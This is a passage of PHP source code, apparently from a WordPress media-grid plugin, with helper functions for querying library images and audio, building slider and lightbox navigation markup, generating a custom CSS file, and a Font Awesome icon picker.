	// can show more?
	$shown = $per_page * $page;
	($shown >= $img_num) ? $more = false : $more = true; 
	
	return array(
		'img'		=> $images, 
		'pag' 		=> $page, 
		'tot_pag' 	=>$tot_pag, 
		'more' 		=> $more, 
		'tot' 		=> $img_num
	);
}


// get the audio files from the WP library
function mg_library_audio($page = 1, $per_page = 15, $search = '') {
	$query_audio_args = array(
		'post_type' => 'attachment', 
		'post_mime_type' =>'audio', 
		'post_status' => 'inherit', 
		'posts_per_page' => $per_page, 
		'paged' => $page
	);
	if(isset($search) && !empty($search)) {
		$query_audio_args['s'] = $search;	
	}
	
	$query_audio = new WP_Query( $query_audio_args );
	$tracks = array();
	
	foreach ( $query_audio->posts as $audio) { 
		$tracks[] = array(
			'id'	=> $audio->ID,
			'url' 	=> $audio->guid, 
			'title' => $audio->post_title
		);
	}
	
	// global images number
	$track_num = $query_audio->found_posts;
	
	// calculate the total
	$tot_pag = ceil($track_num / $per_page);
	
	// can show more?
	$shown = $per_page * $page;
	($shown >= $track_num) ? $more = false : $more = true; 
	
	return array('tracks' => $tracks, 'pag' => $page, 'tot_pag' =>$tot_pag  ,'more' => $more, 'tot' => $track_num);
}


// given an array of selected images or tracks - returns only existing ones
function mg_existing_sel($media, $rel_videos = false) {
	if(is_array($media)) {
		$new_array = array();
		$a = 0;
		
		foreach($media as $media_id) {
			if(is_object( get_post($media_id) )) {
				if($rel_videos === false) {
					$new_array[] = $media_id;
				} else {
					$vid = (isset($rel_videos[$a])) ? $rel_videos[$a] : '';
					$new_array[] = array('img' => $media_id, 'video' => $vid);
				}
			}
			$a++;
		}
		
		if(count($new_array) == 0) {return false;}
		else {return $new_array;}
	}
	else {return false;}	
}


// create selected slider image list - starts from array of associative array
function mg_sel_slider_img_list($data) {
	if(!is_array($data)) {return '<p>'. __('No images selected', 'mg_ml') .' .. </p>';}
	$code = '';
	
	foreach($data as $elem) {
		
		if($elem['video']) {
			$span_title = __('Edit video URL', 'mg_ml');
			$span_class = 'mg_slider_video_on'; 	
		} else {
			$span_title = __('set as video slide', 'mg_ml');
			$span_class = 'mg_slider_video_off'; 		
		}
		
		$thumb_data = wp_get_attachment_image_src($elem['img'], array(90, 90));
		
		$code .= '
		<li>
			<input type="hidden" name="mg_slider_img[]" class="mg_slider_img_field" value="'. $elem['img'] .'" />
			<input type="hidden" name="mg_slider_vid[]" class="mg_slider_video_field" value="'. $elem['video'] .'" autocomplete="off" />
			
			<figure style="background-image: url('. $thumb_data[0] .');"></figure>
			<span title="remove image"></span>
			<i title="'.$span_title.'" class="'.$span_class.'"></i>
		</li>';	
	}
	
	return $code;
}




// create the frontend css and js
function mg_create_frontend_css() {	
	ob_start();
	require(MG_DIR.'/frontend_css.php');
	
	$css = ob_get_clean();
	if(trim($css) != '') {
		if(!@file_put_contents(MG_DIR.'/css/custom.css', $css, LOCK_EX)) {$error = true;}
	}
	else {
		if(file_exists(MG_DIR.'/css/custom.css'))	{
			unlink(MG_DIR.'/css/custom.css');
		}
	}
	
	if(isset($error)) {return false;}
	else {return true;}
}


// custom excerpt
function mg_excerpt($string, $max) {
	$num = strlen($string);
	
	if($num > $max) {
		$string = substr($string, 0, $max) . '..';
	}
	
	return $string;
}


// font-awesome icon picker - hidden lightbox code
function mg_fa_icon_picker_code($no_icon_text) {
	include_once(MG_DIR . '/classes/lc_font_awesome_helper.php');
	$fa = new lc_fontawesome_helper;
	
	$code = '
	<div id="mg_icons_list" style="display: none;">
		<div class="mg_lb_icons_wizard">
			<p rel="" class="mgtoi_no_icon"><a>'. $no_icon_text .'</a></p>';
		
			foreach($fa->sorted_icons as $cat => $icons) {
				$code .= '<h4>'. $cat .'</h4>';
				
				foreach($icons as $iid => $unicode) {
					$idata = $fa->icons[$iid];
					$code .= '<i rel="'.$idata->class.'" class="fa '.$idata->class.'" title="'.$idata->name.'"></i>';
				}
			}
	
	return $code .'
		</div>
	</div>';
}


// font-awesome icon picker - javascript code - direct print
function mg_fa_icon_picker_js() {
	?>
    var $sel_type_opt = false;
	var sel_type_icon = '';
	
	jQuery('body').delegate('.mg_type_opt_icon_trigger i', "click", function() {
		$sel_type_opt = jQuery(this).parent();
		sel_type_icon = jQuery(this).parents('.mg_type_opt_icon_trigger').find('input').val(); 
		
		tb_show('<?php _e('Choose an icon', 'mg_ml') ?>' , '#TB_inline?inlineId=mg_icons_list');
		setTimeout(function() {
			jQuery('#TB_ajaxContent').css('width', 'auto');
			jQuery('#TB_ajaxContent').css('height', (jQuery('#TB_window').height() - 47) );
			
			jQuery('.mg_lb_icons_wizard i').removeClass('mg_lb_sel_icon');	
			if(sel_type_icon) {
				jQuery('.mg_lb_icons_wizard .'+sel_type_icon).addClass('mg_lb_sel_icon');	
			}
		}, 50);
	});
	jQuery(window).resize(function() {
		if( jQuery('#TB_ajaxContent .mg_lb_icons_wizard').size() > 0 ) {
			jQuery('#TB_ajaxContent').css('height', (jQuery('#TB_window').height() - 47) );	
		}
	});
	
	
	// select icon
	jQuery('body').delegate('#TB_ajaxContent .mg_lb_icons_wizard > p, #TB_ajaxContent .mg_lb_icons_wizard > i', "click", function() {
		var val = jQuery(this).attr('rel');
		
		$sel_type_opt.find('input').val(val);
		$sel_type_opt.find('i').attr('class', 'fa '+val);
		
		tb_remove();
		$sel_type_opt = false;
	});
    <?php
}


// item's deeplink URL - for XML sitemap
function mg_item_deeplinked_url($item_id, $item_title) {
	$base_url = get_option('mg_sitemap_baseurl', get_site_url());
	$txt = (empty($item_title)) ? '' : '/'. sanitize_title($item_title);
	
	if(strpos($base_url, '?') === false) {
		return $base_url .'?mgi_='.$item_id.$txt;	
	}  else {
		return $base_url .'&mgi_='.$item_id.$txt;		
	}
}


// lightbox image optimizer - serve best wordpress-managed image depending on featured space sizes
function mg_lb_image_optimizer($img_id, $layout, $lb_max_w, $img_display_mode = 'mg_lb_img_fill_w', $img_max_h = false, $feat_match_txt = false) {
	
	// calculate image's max width
	if(strpos($layout, 'tripartite')) {
		$img_max_w = ceil($lb_max_w * 0.65);	
	}
	elseif(strpos($layout, 'bipartite') !== false) {
		$img_max_w = ceil($lb_max_w / 2);		
	}
	else {
		$img_max_w = $lb_max_w;		
	}
	
	
	// max-height and not fill nor match -> use LC resizing system 
	if($img_max_h && $img_display_mode == 'mg_lb_img_auto_w' && !$feat_match_txt) {
		$canvas_color = substr(get_option('mg_item_bg_color', '#ffffff'), 1);
		return	mg_thumb_src($img_id, $img_max_w, $img_max_h, $quality = 95, $thumb_center = 'c', $resize = 3, $canvas_color);
	}
	
	else {
		$src = wp_get_attachment_image_src($img_id, array($lb_max_w, $lb_max_w));	
		return $src[0];	
	}
}


// lightbox navigation code
function mg_lb_nav_code($prev_next = array('prev' => 0, 'next' => 0), $layout = 'inside') {
	if((!$prev_next['prev'] && !$prev_next['next']) || $layout == 'hidden') {return '';}
	
	// thumb sizes for layout
	switch($layout) {
		case 'inside' 	: $ts = array('w'=>60, 'h'=>60); break;	
		case 'top' 		: $ts = array('w'=>150, 'h'=>150); break;
		case 'side' 	: $ts = array('w'=>340, 'h'=>120); break;
	}
	
	$code = '';
	foreach($prev_next as $dir => $item_id) {
		$active = (!empty($item_id)) ? 'mg_nav_active' : '';
		$side_class = ($layout == 'side') ? 'mg_side_nav' : '';
		$side_vis = ($layout == 'side') ? 'style="display: none;"' : '';
		$thumb_center = (get_post_meta($item_id, 'mg_thumb_center', true)) ? get_post_meta($item_id, 'mg_thumb_center', true) : 'c';
		
		$code .= '
		<div class="mg_lb_nav_'.$layout.' mg_nav_'.$dir.' mg_'.$layout.'_nav_'.$dir.' '.$active.' '.$side_class.'" rel="'.$item_id.'" '.$side_vis.'>
			<i></i>';
			
			if($layout == 'side') {
				$code .= '<span></span>';	
			}
			
			if(!empty($item_id)) {
				$title = get_the_title($item_id);
				
				if($layout == 'inside') {
					$code .= '<div><span>'.$title.'</span></div>';
				}
				elseif($layout == 'top') {
					$thumb = mg_thumb_src(get_post_thumbnail_id($item_id), $ts['w'], $ts['h'], 80, $thumb_center);
					$code .= '<div>'.$title.'<img src="'.$thumb.'" alt="'.mg_sanitize_input($title).'" /></div>';
				}
				elseif($layout == 'side') {
					$thumb = mg_thumb_src(get_post_thumbnail_id($item_id), $ts['w'], $ts['h'], 70, $thumb_center);
					$code .= '<div>'.$title.'</div><img src="'.$thumb.'" alt="'.mg_sanitize_input($title).'" />';
				}
			}
			
		$code .= '</div>';
	}	
	return $code;
}

